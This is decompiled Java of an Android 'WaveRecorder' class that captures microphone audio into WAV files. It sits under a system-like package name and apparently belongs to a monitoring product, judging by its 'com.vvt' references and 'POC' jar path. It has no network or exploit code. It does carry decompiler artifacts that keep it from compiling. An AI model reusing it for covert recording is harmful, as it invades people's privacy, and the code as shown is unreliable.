package com.android.soundrecorders;

import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.RandomAccessFile;

public class WaveRecorder
{
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.b;
  private static final boolean d = com.vvt.ak.a.e;
  private static final boolean e = com.vvt.ak.a.d;
  public Throwable a;
  private AudioRecord f = null;
  private String g = null;
  private WaveRecorder.State h;
  private RandomAccessFile i;
  private short j;
  private int k;
  private short l;
  private int m;
  private int n;
  private int o;
  private int p;
  private int q;
  private byte[] r;
  private int s;
  private boolean t = false;
  private AudioRecord.OnRecordPositionUpdateListener u;
  
  public WaveRecorder(int paramInt1, int paramInt2)
  {
    Object localObject1 = new com/android/soundrecorders/a;
    ((a)localObject1).<init>(this);
    this.u = ((AudioRecord.OnRecordPositionUpdateListener)localObject1);
    int i2 = 16;
    int i4;
    Object localObject3;
    Object localObject2;
    try
    {
      this.l = i2;
      i2 = 1;
      this.j = i2;
      this.n = paramInt2;
      this.k = paramInt1;
      i2 = 2;
      this.o = i2;
      i2 = paramInt1 * 120;
      i2 /= 1000;
      this.p = i2;
      i2 = this.p * 2;
      i4 = this.l;
      i2 *= i4;
      i4 = this.j;
      i2 *= i4;
      i2 /= 8;
      this.m = i2;
      i2 = this.m;
      i4 = 2;
      int i5 = 2;
      i4 = AudioRecord.getMinBufferSize(paramInt1, i4, i5);
      if (i2 < i4)
      {
        i2 = 2;
        i4 = 2;
        i2 = AudioRecord.getMinBufferSize(paramInt1, i2, i4);
        this.m = i2;
        i2 = this.m;
        i4 = this.l * 2;
        i5 = this.j;
        i4 *= i5;
        i4 /= 8;
        i2 /= i4;
        this.p = i2;
        boolean bool1 = e;
        if (!bool1) {}
      }
      localObject1 = new android/media/AudioRecord;
      int i6 = 2;
      int i7 = 2;
      int i8 = this.m;
      i4 = paramInt2;
      i5 = paramInt1;
      ((AudioRecord)localObject1).<init>(paramInt2, paramInt1, i6, i7, i8);
      this.f = ((AudioRecord)localObject1);
      localObject1 = this.f;
      int i3 = ((AudioRecord)localObject1).getState();
      if (i3 == i1) {
        break label373;
      }
      localObject1 = new java/lang/Exception;
      localObject3 = "AudioRecord initialization failed";
      ((Exception)localObject1).<init>((String)localObject3);
      throw ((Throwable)localObject1);
    }
    catch (Exception localException)
    {
      this.a = localException;
      localObject2 = localException.getMessage();
      if (localObject2 == null) {
        break label447;
      }
    }
    boolean bool2 = d;
    if (bool2) {}
    for (;;)
    {
      localObject2 = WaveRecorder.State.ERROR;
      this.h = ((WaveRecorder.State)localObject2);
      for (;;)
      {
        return;
        label373:
        localObject2 = this.f;
        localObject3 = this.u;
        ((AudioRecord)localObject2).setRecordPositionUpdateListener((AudioRecord.OnRecordPositionUpdateListener)localObject3);
        localObject2 = this.f;
        i4 = this.p;
        ((AudioRecord)localObject2).setPositionNotificationPeriod(i4);
        bool2 = false;
        localObject2 = null;
        this.g = null;
        localObject2 = WaveRecorder.State.INITIALIZING;
        this.h = ((WaveRecorder.State)localObject2);
        bool2 = b;
        if (!bool2) {}
      }
      label447:
      bool2 = d;
      if (!bool2) {}
    }
  }
  
  private void a(File paramFile1, File paramFile2)
  {
    FileInputStream localFileInputStream = new java/io/FileInputStream;
    localFileInputStream.<init>(paramFile2);
    FileOutputStream localFileOutputStream = new java/io/FileOutputStream;
    localFileOutputStream.<init>(paramFile1, true);
    int i1 = 102400;
    byte[] arrayOfByte = new byte[i1];
    for (;;)
    {
      int i2 = localFileInputStream.read(arrayOfByte);
      if (i2 < 0) {
        break;
      }
      if (i2 > 0) {
        localFileOutputStream.write(arrayOfByte, 0, i2);
      }
    }
    localFileOutputStream.flush();
    localFileOutputStream.close();
    localFileInputStream.close();
  }
  
  private void a(File paramFile1, File paramFile2, int paramInt1, int paramInt2)
  {
    int i1 = c;
    if (i1 != 0) {}
    FileInputStream localFileInputStream = new java/io/FileInputStream;
    localFileInputStream.<init>(paramFile1);
    FileOutputStream localFileOutputStream = new java/io/FileOutputStream;
    localFileOutputStream.<init>(paramFile2);
    long l1 = paramInt1;
    localFileInputStream.skip(l1);
    int i3 = paramInt2 - paramInt1;
    byte[] arrayOfByte = new byte[102400];
    i1 = 0;
    for (;;)
    {
      int i4 = localFileInputStream.read(arrayOfByte);
      if ((i4 < 0) || (i1 >= i3)) {
        break;
      }
      if (i4 > 0) {
        localFileOutputStream.write(arrayOfByte, 0, i4);
      }
      int i2;
      i1 += i4;
    }
    localFileOutputStream.flush();
    localFileInputStream.close();
    localFileOutputStream.close();
  }
  
  public WaveRecorder.State a()
  {
    return this.h;
  }
  
  public void a(int paramInt, boolean paramBoolean)
  {
    int i1 = -1;
    long l1 = 44;
    File localFile = null;
    int i4;
    if (paramInt >= i1)
    {
      int i2 = this.s + 44;
      if (paramInt <= i2) {}
    }
    else
    {
      localObject1 = new java/lang/IllegalArgumentException;
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject3 = ((StringBuilder)localObject3).append("fromPosition out of range: was ").append(paramInt).append(", min/max=-1/");
      i4 = this.s + 44;
      localObject3 = i4;
      ((IllegalArgumentException)localObject1).<init>((String)localObject3);
      throw ((Throwable)localObject1);
    }
    Object localObject1 = this.h;
    Object localObject3 = WaveRecorder.State.READY;
    Object localObject4;
    boolean bool1;
    if (localObject1 == localObject3)
    {
      this.f.startRecording();
      localObject1 = this.f;
      localObject3 = this.r;
      localObject4 = this.r;
      i4 = localObject4.length;
      ((AudioRecord)localObject1).read((byte[])localObject3, 0, i4);
      bool1 = b;
      if (bool1) {}
      localObject1 = WaveRecorder.State.RECORDING;
      this.h = ((WaveRecorder.State)localObject1);
    }
    for (;;)
    {
      return;
      localObject1 = this.h;
      localObject3 = WaveRecorder.State.STOPPED;
      if (localObject1 == localObject3) {
        for (;;)
        {
          long l2;
          Object localObject5;
          int i6;
          try
          {
            localObject1 = this.i;
            ((RandomAccessFile)localObject1).length();
            if (paramInt != i1) {
              break label353;
            }
            localObject1 = this.i;
            l2 = ((RandomAccessFile)localObject1).length();
            i4 = 0;
            localObject4 = null;
            this.t = false;
            boolean bool3 = c;
            if (bool3) {}
            localObject4 = this.i;
            ((RandomAccessFile)localObject4).seek(l2);
            localObject1 = this.f;
            ((AudioRecord)localObject1).startRecording();
            localObject1 = this.f;
            localObject3 = this.r;
            bool3 = false;
            localObject4 = null;
            localObject5 = this.r;
            i6 = localObject5.length;
            ((AudioRecord)localObject1).read((byte[])localObject3, 0, i6);
            bool1 = b;
            if (bool1) {}
            localObject1 = WaveRecorder.State.RECORDING;
            this.h = ((WaveRecorder.State)localObject1);
          }
          catch (IOException localIOException)
          {
            this.a = localIOException;
            bool1 = d;
          }
          if (!bool1) {
            break;
          }
          break;
          label353:
          int i3;
          boolean bool4;
          if (paramBoolean)
          {
            l2 = paramInt;
            localFile = new java/io/File;
            Object localObject6 = this.g;
            localFile.<init>((String)localObject6);
            localObject6 = new java/io/File;
            String str = "./temp.wav";
            ((File)localObject6).<init>(str);
            boolean bool5 = l2 < l1;
            if (bool5)
            {
              bool1 = e;
              if (bool1) {}
              l2 = l1;
            }
            long l3 = l2 - l1;
            int i8 = this.q;
            long l4 = i8;
            l4 = l3 % l4;
            long l5 = 0L;
            boolean bool7 = l4 < l5;
            if (bool7)
            {
              i3 = this.q;
              l2 = i3 + l3;
              l3 = 1L;
              l2 -= l3;
              int i7 = this.q;
              l3 = i7;
              l2 /= l3;
              i7 = this.q;
              l3 = i7;
              l2 *= l3;
              boolean bool6 = e;
              if (bool6) {}
              l2 += l1;
            }
            int i5 = (int)l2;
            localObject5 = this.i;
            l3 = ((RandomAccessFile)localObject5).length();
            i6 = (int)l3;
            a(localFile, (File)localObject6, i5, i6);
            localObject4 = this.i;
            ((RandomAccessFile)localObject4).setLength(l2);
            i5 = 1;
            this.t = i5;
            bool4 = c;
            if (!bool4) {}
          }
          else
          {
            localObject2 = this.i;
            l2 = ((RandomAccessFile)localObject2).length();
            l1 = paramInt;
            l2 -= l1;
            i3 = (int)l2;
            boolean bool8 = c;
            if (bool8) {}
            int i9 = this.s;
            i3 = i9 - i3;
            this.s = i3;
            l2 = paramInt;
            localObject4 = this.i;
            ((RandomAccessFile)localObject4).setLength(l2);
            bool4 = false;
            localObject4 = null;
            this.t = false;
          }
        }
      }
      boolean bool2 = d;
      if (bool2) {}
      Object localObject2 = WaveRecorder.State.ERROR;
      this.h = ((WaveRecorder.State)localObject2);
    }
  }
  
  public void a(String paramString)
  {
    WaveRecorder.State localState1 = this.h;
    WaveRecorder.State localState2 = WaveRecorder.State.INITIALIZING;
    if (localState1 == localState2) {
      this.g = paramString;
    }
    for (;;)
    {
      return;
      boolean bool = d;
      if (!bool) {}
    }
  }
  
  public void b()
  {
    int i1 = 1;
    int i2 = 0;
    String str = null;
    boolean bool2 = b;
    if (bool2) {}
    label67:
    boolean bool1;
    label500:
    label508:
    Object localObject4;
    try
    {
      Object localObject1 = this.h;
      Object localObject2 = WaveRecorder.State.INITIALIZING;
      if (localObject1 != localObject2) {
        break label572;
      }
      localObject1 = this.f;
      int i6 = ((AudioRecord)localObject1).getState();
      Object localObject3;
      if (i6 == i1)
      {
        i6 = i1;
        localObject2 = this.g;
        if (localObject2 == null) {
          break label500;
        }
        i1 &= i6;
        if (i1 == 0) {
          break label508;
        }
        localObject3 = new java/io/RandomAccessFile;
        str = this.g;
        localObject1 = "rw";
        ((RandomAccessFile)localObject3).<init>(str, (String)localObject1);
        this.i = ((RandomAccessFile)localObject3);
        localObject3 = this.i;
        long l1 = 0L;
        ((RandomAccessFile)localObject3).setLength(l1);
        localObject3 = this.i;
        str = "RIFF";
        ((RandomAccessFile)localObject3).writeBytes(str);
        localObject3 = this.i;
        i2 = 0;
        str = null;
        ((RandomAccessFile)localObject3).writeInt(0);
        localObject3 = this.i;
        str = "WAVE";
        ((RandomAccessFile)localObject3).writeBytes(str);
        localObject3 = this.i;
        str = "fmt ";
        ((RandomAccessFile)localObject3).writeBytes(str);
        localObject3 = this.i;
        i2 = 16;
        i2 = Integer.reverseBytes(i2);
        ((RandomAccessFile)localObject3).writeInt(i2);
        localObject3 = this.i;
        i2 = 1;
        short s1 = Short.reverseBytes(i2);
        ((RandomAccessFile)localObject3).writeShort(s1);
        localObject3 = this.i;
        s1 = this.j;
        s1 = Short.reverseBytes(s1);
        ((RandomAccessFile)localObject3).writeShort(s1);
        localObject3 = this.i;
        int i3 = this.k;
        i3 = Integer.reverseBytes(i3);
        ((RandomAccessFile)localObject3).writeInt(i3);
        localObject3 = this.i;
        i3 = this.k;
        int i7 = this.l;
        i3 *= i7;
        int i8 = this.j;
        i3 *= i8;
        i3 /= 8;
        i3 = Integer.reverseBytes(i3);
        ((RandomAccessFile)localObject3).writeInt(i3);
        i1 = this.j;
        i3 = this.l;
        i1 *= i3;
        i1 /= 8;
        this.q = i1;
        localObject3 = this.i;
        i3 = (short)this.q;
        int i4 = Short.reverseBytes(i3);
        ((RandomAccessFile)localObject3).writeShort(i4);
        localObject3 = this.i;
        i4 = this.l;
        i4 = Short.reverseBytes(i4);
        ((RandomAccessFile)localObject3).writeShort(i4);
        localObject3 = this.i;
        str = "data";
        ((RandomAccessFile)localObject3).writeBytes(str);
        localObject3 = this.i;
        i4 = 0;
        str = null;
        ((RandomAccessFile)localObject3).writeInt(0);
        i1 = this.p;
        i4 = this.l;
        i1 *= i4;
        i1 /= 8;
        int i5 = this.j;
        i1 *= i5;
        localObject3 = new byte[i1];
        this.r = ((byte[])localObject3);
        localObject3 = WaveRecorder.State.READY;
        this.h = ((WaveRecorder.State)localObject3);
        i1 = 0;
        localObject3 = null;
        this.s = 0;
        bool1 = b;
        if (!bool1) {}
      }
      for (;;)
      {
        bool1 = b;
        if (bool1) {}
        return;
        int i9 = 0;
        localObject1 = null;
        break;
        bool1 = false;
        localObject3 = null;
        break label67;
        bool1 = d;
        if (bool1) {}
        localObject3 = WaveRecorder.State.ERROR;
        this.h = ((WaveRecorder.State)localObject3);
      }
      bool1 = d;
    }
    catch (Exception localException)
    {
      this.a = localException;
      localObject4 = localException.getMessage();
      if (localObject4 == null) {
        break label598;
      }
    }
    if (bool1) {}
    for (;;)
    {
      localObject4 = WaveRecorder.State.ERROR;
      this.h = ((WaveRecorder.State)localObject4);
      break;
      label572:
      bool1 = d;
      if (bool1) {}
      c();
      localObject4 = WaveRecorder.State.ERROR;
      this.h = ((WaveRecorder.State)localObject4);
      break;
      label598:
      bool1 = d;
      if (!bool1) {}
    }
  }
  
  public void c()
  {
    bool = b;
    if (bool) {}
    Object localObject1 = this.h;
    Object localObject2 = WaveRecorder.State.RECORDING;
    if (localObject1 == localObject2) {
      f();
    }
    for (;;)
    {
      localObject1 = this.f;
      if (localObject1 != null)
      {
        localObject1 = this.f;
        ((AudioRecord)localObject1).release();
      }
      bool = b;
      if (bool) {}
      return;
      localObject1 = this.h;
      localObject2 = WaveRecorder.State.READY;
      if (localObject1 == localObject2) {}
      try
      {
        localObject1 = this.i;
        ((RandomAccessFile)localObject1).close();
      }
      catch (IOException localIOException)
      {
        for (;;)
        {
          bool = d;
          if (!bool) {}
        }
      }
      localObject1 = new java/io/File;
      localObject2 = this.g;
      ((File)localObject1).<init>((String)localObject2);
      ((File)localObject1).delete();
    }
  }
  
  public void d()
  {
    bool = b;
    if (bool) {}
    try
    {
      Object localObject1 = this.h;
      Object localObject2 = WaveRecorder.State.ERROR;
      if (localObject1 != localObject2)
      {
        c();
        bool = false;
        localObject1 = null;
        this.g = null;
        localObject1 = new android/media/AudioRecord;
        int i1 = this.n;
        int i2 = this.k;
        int i3 = this.j + 1;
        int i4 = this.o;
        int i5 = this.m;
        ((AudioRecord)localObject1).<init>(i1, i2, i3, i4, i5);
        this.f = ((AudioRecord)localObject1);
        localObject1 = this.f;
        localObject2 = this.u;
        ((AudioRecord)localObject1).setRecordPositionUpdateListener((AudioRecord.OnRecordPositionUpdateListener)localObject2);
        localObject1 = this.f;
        i1 = this.p;
        ((AudioRecord)localObject1).setPositionNotificationPeriod(i1);
        localObject1 = WaveRecorder.State.INITIALIZING;
        this.h = ((WaveRecorder.State)localObject1);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        this.a = localException;
        bool = d;
        if (bool) {}
        WaveRecorder.State localState = WaveRecorder.State.ERROR;
        this.h = localState;
      }
    }
    bool = b;
    if (bool) {}
  }
  
  public void e()
  {
    boolean bool = b;
    if (bool) {}
    a(-1, false);
    bool = b;
    if (bool) {}
  }
  
  public void f()
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = this.h;
    Object localObject2 = WaveRecorder.State.RECORDING;
    boolean bool2;
    if (localObject1 == localObject2)
    {
      localObject1 = this.f;
      ((AudioRecord)localObject1).stop();
      try
      {
        localObject1 = this.i;
        long l1 = 4;
        ((RandomAccessFile)localObject1).seek(l1);
        localObject1 = this.i;
        int i2 = this.s + 36;
        i2 = Integer.reverseBytes(i2);
        ((RandomAccessFile)localObject1).writeInt(i2);
        localObject1 = this.i;
        l1 = 40;
        ((RandomAccessFile)localObject1).seek(l1);
        localObject1 = this.i;
        i2 = this.s;
        i2 = Integer.reverseBytes(i2);
        ((RandomAccessFile)localObject1).writeInt(i2);
        bool1 = c;
        if (bool1) {}
        bool1 = this.t;
        if (bool1)
        {
          localObject1 = new java/io/File;
          localObject2 = "./temp.wav";
          ((File)localObject1).<init>((String)localObject2);
          localObject2 = new java/io/File;
          Object localObject3 = this.g;
          ((File)localObject2).<init>((String)localObject3);
          a((File)localObject2, (File)localObject1);
          localObject1 = this.i;
          long l2 = ((RandomAccessFile)localObject1).length();
          int i1 = (int)l2;
          i2 = i1 + -8;
          i1 += -44;
          localObject3 = this.i;
          long l3 = 4;
          ((RandomAccessFile)localObject3).seek(l3);
          localObject3 = this.i;
          i2 = Integer.reverseBytes(i2);
          ((RandomAccessFile)localObject3).writeInt(i2);
          localObject2 = this.i;
          long l4 = 40;
          ((RandomAccessFile)localObject2).seek(l4);
          localObject2 = this.i;
          int i3 = Integer.reverseBytes(i1);
          ((RandomAccessFile)localObject2).writeInt(i3);
          this.s = i1;
        }
        bool2 = b;
        if (!bool2) {}
      }
      catch (IOException localIOException)
      {
        for (;;)
        {
          bool2 = d;
          if (bool2) {}
          localState = WaveRecorder.State.ERROR;
          this.h = localState;
        }
      }
      localObject1 = WaveRecorder.State.STOPPED;
    }
    WaveRecorder.State localState;
    for (this.h = ((WaveRecorder.State)localObject1);; this.h = localState)
    {
      bool2 = b;
      if (bool2) {}
      return;
      bool2 = d;
      if (bool2) {}
      localState = WaveRecorder.State.ERROR;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/android/soundrecorders/WaveRecorder.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */